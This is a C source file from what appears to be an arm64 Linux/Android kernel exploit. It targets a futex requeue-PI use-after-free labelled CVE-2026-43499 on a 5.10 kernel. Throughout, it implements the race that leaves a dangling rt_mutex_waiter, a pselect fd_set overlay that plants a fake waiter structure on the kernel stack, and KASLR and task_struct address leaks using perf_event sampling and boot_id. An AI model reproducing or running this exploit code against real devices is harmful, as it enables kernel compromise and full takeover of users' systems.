#include "common.h"
#include <linux/perf_event.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#define SLIDE_MAX_ATTEMPTS 3
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
/* The SIGALRM handler fires (sigalrm=1, setprio_ret=0, pkill_ret=0 confirmed on
   device) but FUTEX_WAIT_REQUEUE_PI restarts rather than aborting, so the waiter
   always leaves by timeout (werrno=110). Keep the timeout SHORT so the overlay +
   consumer trigger run while the dangling state is fresh, and so many shift-sweep
   attempts fit inside the launcher's 60s window (each attempt ??wait + pselect). */
#define SLIDE_WAIT_SECONDS 2

/* Runtime word shift for the pselect overlay. Centered on the measured
   PSELECT_WAITER_WORD_SHIFT but swept across attempts (see slide_leak_kernel_base):
   the frame-derived shift is a hand estimate, so ??like duchamp ??we do not trust a
   single value and instead try neighboring alignments on the device. Set in the
   parent before each fork; the child inherits it as a global copy. */
static int slide_word_shift;
uint64_t g_slide_waiter_prio = FAKE_WAITER_PRIO;

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;

/* SIGALRM trigger diagnostics: did the handler actually fire during the wait,
   and what did its setpriority() return? (async-signal-safe: atomics only, no
   logging from the handler). Reported to the parent via the pipe. */
static atomic_int slide_sigalrm_count;
static atomic_int slide_sigalrm_setprio_ret;
static int slide_dbg_pthread_kill_ret = -1;

/* diagnostics routed to the parent (child logcat fd dies after pselect fd install) */
static long slide_dbg_wait_ret;
static int slide_dbg_wait_errno;
static int slide_dbg_pselect_ret;
static int slide_dbg_pselect_errno;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name) {
  int global_word = shift + waiter_word;
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  int shift = slide_word_shift;
  /* §124.46: the overlay chain follows the slide anchor too (both the chain
     and the staging must use the same anchor).
     §124.108 Q2: write rounds (pr_wparent=1, set by persist plan case 4/5/6)
     point parent at the in-page fake anchor (page_base+0x500, content staged
     post-rebuild) - fixup terminates in-page, zero live chase.
     §124.109 PERF9-update: parent-only fake still dies - left (= B, the true
     cred slot) chases live task state at +0x10.  Write rounds use self-left:
     left := fake-anchor+0x10 (in-page zero cell).  Read rounds keep left = B. */
  extern int pr_wparent;
  extern uintptr_t page_base;
  /* §124.111 PERF13 bisect: parent back to anchor (fake-anchor content is
     suspect #1).  Self-left kept.  If alive: fake content kills.  If dead:
     parent innocent, left is suspect. */
  extern int perf_bisect_parent;
  /* §124.112 PERF14 bisect 2: left back to B (self-left is suspect #2).
     Fake parent kept.  If alive: self-left kills.  If dead: parent kills. */
  extern int perf_bisect_left;
  int wfake = (pr_wparent && page_base && !perf_bisect_parent) ? 1 : 0;
  uintptr_t anchor = wfake ? page_base + 0x500 :
                   pr_slide_ns == 2 ? SLIDE_TASK_PREV_PTR :
                   pr_slide_ns ? SLIDE_TASK_NSPROXY_PTR : SLIDE_LOGGERS_0_1;
  uintptr_t wleft = (wfake && !perf_bisect_left) ? page_base + 0x510 :
                    (uintptr_t)SLIDE_RANDOM_BOOT_ID_DATA;
  struct slide_waiter_word {
    int word;
    int shift;
    uint64_t value;
    const char *name;
  } words[] = {
    /* aristotle / kernel 5.10.136: rt_mutex_waiter is the OLD flat layout
       (no rt_waiter_node nesting, no wake_state/ww_ctx). Verified by disasm of
       rt_mutex_init_waiter / try_to_take_rt_mutex:
         tree_entry(rb_node) 0x00  pi_tree_entry(rb_node) 0x18
         task 0x30  lock 0x38  prio 0x40  deadline 0x48   (sizeof ~0x50)
       6.12's 13-word table (nested tree.prio/deadline + pi + wake_state) is
       replaced by this 10-word table. */
    {0, shift, anchor, "tree_pc"},           /* tree_entry.__rb_parent_color 0x00 */
    {1, shift, 0, "tree_right"},                        /* tree_entry.rb_right          0x08 */
    {2, shift, wleft, "tree_left"}, /* tree_entry.rb_left           0x10 */
    {3, shift, anchor, "pi_parent"},         /* pi_tree_entry.__rb_parent_color 0x18 */
    {4, shift, 0, "pi_right"},                          /* pi_tree_entry.rb_right       0x20 */
    {5, shift, wleft, "pi_left"},   /* pi_tree_entry.rb_left        0x28 */
    {6, shift, SLIDE_INIT_TASK, "task"},                /* task                         0x30 */
    {7, shift, fake_lock, "lock"},                      /* lock                         0x38 */
    {8, shift, g_slide_waiter_prio, "prio"},               /* prio (flat)                  0x40 */
    {9, shift, 0, "deadline"},                          /* deadline (flat)              0x48 */
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->shift, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  pr_info("slide pselect setup shift=%d page=%016zx fake_lock=%016zx "
          "fake_w0=%016zx fake_task=%016zx\n",
          slide_word_shift, page_base, fake_lock, fake_w0, fake_task);
  pr_info("slide pselect before fd install nfds=%d\n", SLIDE_PSELECT_NFDS);
  open_slide_selected_fds(&in, &out, &ex, high_read);
  pr_info("slide pselect after fd install\n");

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_go, 1);
  pr_info("slide pselect before syscall\n");
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  slide_dbg_pselect_ret = ret;
  slide_dbg_pselect_errno = saved_errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

/* Returns 1 once the waiter thread is sleeping inside the kernel - i.e. it has
   passed the syscall entry and (for pselect6) already copied the fd_set overlay
   onto its kernel stack.  This removes the fixed-delay race between the waiter's
   pselect overlay and the consumer's sched_setattr. */
static int slide_waiter_blocked_in_syscall(int tid) {
  char path[64];
  char buf[256];
  snprintf(path, sizeof(path), "/proc/%d/stat", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = '\0';
  char *close_paren = strrchr(buf, ')');
  if (!close_paren || close_paren[1] != ' ' || close_paren[2] == '\0') {
    return 0;
  }
  char state = close_paren[2];
  return state == 'S' || state == 'D';
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    for (unsigned long spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    /* Wait until the waiter is blocked in the kernel (the pselect fd_set
       overlay is on its stack), then give it a moment to settle. */
    int waiter = atomic_load(&slide_waiter_tid);
    for (int spin = 0; spin < 500; spin++) {
      if (slide_waiter_blocked_in_syscall(waiter)) {
        break;
      }
      usleep(200);
    }
    usleep(PSELECT_ENTER_DELAY_USEC);

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    pr_info("slide consumer before tgkill tid=%d calls=%d\n", tid, calls);
    errno = 0;
    long alive_ret = syscall(SYS_tgkill, getpid(), tid, 0);
    int alive_errno = errno;
    pr_info("slide consumer before sched tid=%d alive_ret=%ld "
            "alive_errno=%d\n",
            tid, alive_ret, alive_errno);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    pr_info("slide consumer sched tid=%d alive_ret=%ld alive_errno=%d "
            "sched_ret=%ld sched_errno=%d\n",
            tid, alive_ret, alive_errno, ret, saved_errno);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

/* Signal-interrupt trigger for the requeue-PI wait (mirrors duchamp).
   CVE-2026-43499 is a requeue-PI + signal race: the dangling rt_mutex_waiter
   (the UAF the pselect overlay later re-occupies) is created only when the
   waiter is signal-interrupted *while blocked on the PI mutex* and re-adjusts
   its priority from the handler. Letting FUTEX_WAIT_REQUEUE_PI end by plain
   timeout (werrno=110 ETIMEDOUT, as observed) takes the clean dequeue path and
   never arms the bug ??so no shift/overlay can leak. setpriority() from the
   handler forces the on-mutex prio adjustment; who=0 targets the calling
   (waiter) thread. */
static void slide_alarm_handler(int sig __attribute__((unused))) {
  long r = syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
  atomic_store(&slide_sigalrm_setprio_ret, (int)r);
  atomic_fetch_add(&slide_sigalrm_count, 1);
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = slide_alarm_handler;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGALRM, &sa, NULL);

  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGALRM);
  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  slide_dbg_wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                                &slide_f_pi_target, 0);
  slide_dbg_wait_errno = errno;
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  signal(SIGALRM, SIG_DFL);

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

static uint64_t slide_dbg_leaked;  /* last boot_id leak, reported via parent pipe */

int perf_slide_done;

/* §124.103 perf SAMPLE_IP slide leak (sabrina recipe, ported from perftest.c).
   PERF_TYPE_SOFTWARE + CPU_CLOCK(5000) + IP|TID, getpid storm 3M, TID filter,
   min kernel IP & ~2MB = _text block anchor.  Deterministic (~1 min), no walk.
   Fills kaslr_base (anchor) + kaslr_slide + perf_slide_done. */
int perf_leak_slide(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID;
  pe.disabled = 1;
  uint32_t my_tid = (uint32_t)syscall(__NR_gettid);
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf slide open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf slide mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 3000000; i++) {
    syscall(__NR_getpid);
    __asm__ volatile("yield");
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uint64_t min_ip = (uint64_t)-1;
  int total = 0, mine = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip = 0;
      memcpy(&ip, p, 8); p += 8;
      uint32_t s_pid = 0, s_tid = 0;
      memcpy(&s_pid, p, 4); memcpy(&s_tid, p + 4, 4);
      total++;
      if (s_tid == my_tid) {
        mine++;
        if (ip >= 0xffffffc000000000ULL && ip < min_ip) min_ip = ip;
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);
  pr_success("perf slide samples total=%d mine=%d min_ip=%016llx\n",
             total, mine, (unsigned long long)min_ip);
  if (min_ip == (uint64_t)-1) {
    pr_warning("perf slide: no kernel IP\n");
    return 0;
  }
  uint64_t anchor = min_ip & ~0x1fffffULL;
  extern uint64_t kaslr_base;
  extern uint64_t kaslr_slide;
  kaslr_base = anchor;
  kaslr_slide = anchor - KIMAGE_TEXT_BASE;
  if (anchor < KIMAGE_TEXT_BASE || (kaslr_slide & 0x1fffffULL) != 0) {
    pr_warning("perf slide INSANE anchor=%016llx slide=%016llx\n",
               (unsigned long long)anchor, (unsigned long long)kaslr_slide);
    return 0;
  }
  perf_slide_done = 1;
  pr_success("perf slide SANE anchor=%016llx slide=%016llx\n",
             (unsigned long long)anchor, (unsigned long long)kaslr_slide);
  return 1;
}

static int cmp64_task(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return (x > y) - (x < y);
}

/* §124.123 E3: perf REGS_INTR own-task leak (sabrina recipe, taskleak.c port).
   Zero walk: getpid storm + TID filter + modal linear-range reg = own
   task_struct. Fills *out_task, returns 1 on MODAL-STRONG. ~1 min. */
int perf_leak_task(uintptr_t *out_task) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1; /* x0-x30 */
  pe.disabled = 1;
  uint32_t my_tid = (uint32_t)syscall(__NR_gettid);
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf task open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf task mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 3000000; i++) {
    syscall(__NR_getpid);
    __asm__ volatile("yield");
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  static uint64_t cands[32768];
  int nc = 0, total = 0, mine = 0;
  while (pos < head && nc < 32768) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint32_t s_pid = 0, s_tid = 0;
      memcpy(&s_pid, p, 4); memcpy(&s_tid, p + 4, 4); p += 8;
      total++;
      if (s_tid == my_tid) {
        mine++;
        uint64_t abi = 0;
        memcpy(&abi, p, 8); p += 8;
        if (abi == 1 || abi == 2) {
          for (int i = 0; i < 31 && nc < 32768; i++) {
            uint64_t v = 0;
            memcpy(&v, p + i * 8, 8);
            if (v >= P0_PAGE_OFFSET && v < 0xffffffc000000000ULL)
              cands[nc++] = v;
          }
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);
  if (!nc) {
    pr_warning("perf task: no candidates\n");
    return 0;
  }
  qsort(cands, (size_t)nc, 8, cmp64_task);
  uint64_t best_v = cands[0];
  int best_n = 1;
  for (int i = 0; i < nc;) {
    int j = i + 1;
    while (j < nc && cands[j] == cands[i]) j++;
    if (j - i > best_n) {
      best_n = j - i;
      best_v = cands[i];
    }
    i = j;
  }
  pr_success("perf task modal=%016llx share=%d/%d %s\n",
             (unsigned long long)best_v, best_n, nc,
             (best_n * 2 > nc) ? "STRONG" : "WEAK");
  if (best_n * 2 <= nc) return 0;
  if (out_task) *out_task = (uintptr_t)best_v;
  return 1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  slide_dbg_leaked = 0xDEAD0000ULL;  /* sentinel: boot_id read/parse not reached */
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  slide_dbg_leaked = leaked;
  pr_info("slide boot_id raw=%02x%02x%02x%02x%02x%02x%02x%02x"
          "%02x%02x%02x%02x%02x%02x%02x%02x leaked=%016llx\n",
          raw[0], raw[1], raw[2], raw[3], raw[4], raw[5], raw[6], raw[7],
          raw[8], raw[9], raw[10], raw[11], raw[12], raw[13], raw[14], raw[15],
          (unsigned long long)leaked);
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  /* Block SIGALRM here so owner/consumer inherit the block; only the waiter
     unblocks it. This makes pthread_kill(waiter, SIGALRM) below deliver to the
     waiter thread specifically. */
  sigset_t block;
  sigemptyset(&block);
  sigaddset(&block, SIGALRM);
  pthread_sigmask(SIG_BLOCK, &block, NULL);

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  pr_info("QDBG pre-requeue f_wait=%08x pi_target=%08x pi_chain=%08x waiting=%d\n",
          slide_f_wait, slide_f_pi_target, slide_f_pi_chain,
          atomic_load(&slide_waiter_waiting));
  long rq = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                     &slide_f_pi_target, 0);
  int rq_errno = errno;
  pr_info("slide CMP_REQUEUE_PI ret=%ld errno=%d\n", rq, errno);
  pr_info("QDBG post-requeue f_wait=%08x pi_target=%08x rq_errno=%d\n",
          slide_f_wait, slide_f_pi_target, rq_errno);

  /* Arm the bug: signal-interrupt the requeued PI wait ~50ms in, so the waiter
     re-adjusts priority from the SIGALRM handler while still blocked on the PI
     mutex (see slide_alarm_handler). Without this the wait ends by timeout and
     no dangling waiter is created. Mirrors duchamp's 50ms pthread_kill. */
  usleep(50000);
  slide_dbg_pthread_kill_ret = pthread_kill(waiter, SIGALRM);
  pr_info("slide pthread_kill(waiter, SIGALRM) ret=%d\n",
          slide_dbg_pthread_kill_ret);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  /* Sweep the overlay word shift. The frame-derived PSELECT_WAITER_WORD_SHIFT is
     an unverified hand estimate (no working 5.10 reference exists ??popsicle is
     6.12, duchamp 6.1), and shift 0/1 leaked nothing on device, so search wider.
     POSITIVE ONLY: a negative shift pushes the low overlay words to negative
     global_word and they are silently dropped ("cannot place tree_pc") ??the
     fake waiter's tree_entry (words 0-2) is then never written, so negative
     shifts can never form a full overlay. Center-first among the positives. */
  const int shift_sweep[] = {0, 0, 0, 0, 0, 0, 0, 0};
  const int n_shifts = (int)(sizeof(shift_sweep) / sizeof(shift_sweep[0]));

  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    slide_word_shift =
        PSELECT_WAITER_WORD_SHIFT + shift_sweep[(attempt - 1) % n_shifts];

    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    pr_info("slide attempt %d uses pselect shift=%d\n",
            attempt, slide_word_shift);

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      /* The child's own logcat fd is clobbered by the pselect fd install, so
         the leak value can only travel back to the parent through this pipe. */
      uint64_t out[12] = {
          stext, slide_dbg_leaked,
          (uint64_t)slide_dbg_wait_ret, (uint64_t)(uint32_t)slide_dbg_wait_errno,
          (uint64_t)(uint32_t)slide_dbg_pselect_ret,
          (uint64_t)(uint32_t)slide_dbg_pselect_errno,
          (uint64_t)(uint32_t)atomic_load(&slide_consume_sched_ok),
          (uint64_t)(uint32_t)atomic_load(&slide_consume_last_sched_ret),
          (uint64_t)(uint32_t)atomic_load(&slide_consume_last_sched_errno),
          (uint64_t)(uint32_t)atomic_load(&slide_sigalrm_count),
          (uint64_t)(uint32_t)atomic_load(&slide_sigalrm_setprio_ret),
          (uint64_t)(uint32_t)slide_dbg_pthread_kill_ret };
      (void)write(fds[1], out, sizeof(out));
      _exit(stext ? 0 : 1);
    }

    SYSCHK(close(fds[1]));
    uint64_t out[12] = { 0 };
    ssize_t n = read(fds[0], out, sizeof(out));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    uint64_t stext = out[0];
    pr_info("slide attempt %d shift=%d leaked=%016llx stext=%016llx "
            "wait_ret=%lld werrno=%u pselect_ret=%lld perrno=%u "
            "sched_ok=%u sched_ret=%lld sched_errno=%u "
            "sigalrm=%u setprio_ret=%d pkill_ret=%d\n",
            attempt, slide_word_shift,
            (unsigned long long)out[1], (unsigned long long)stext,
            (long long)(int64_t)out[2], (unsigned)out[3],
            (long long)(int64_t)out[4], (unsigned)out[5],
            (unsigned)out[6], (long long)(int64_t)out[7], (unsigned)out[8],
            (unsigned)out[9], (int)(int32_t)out[10], (int)(int32_t)out[11]);
    if (n != (ssize_t)sizeof(out) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
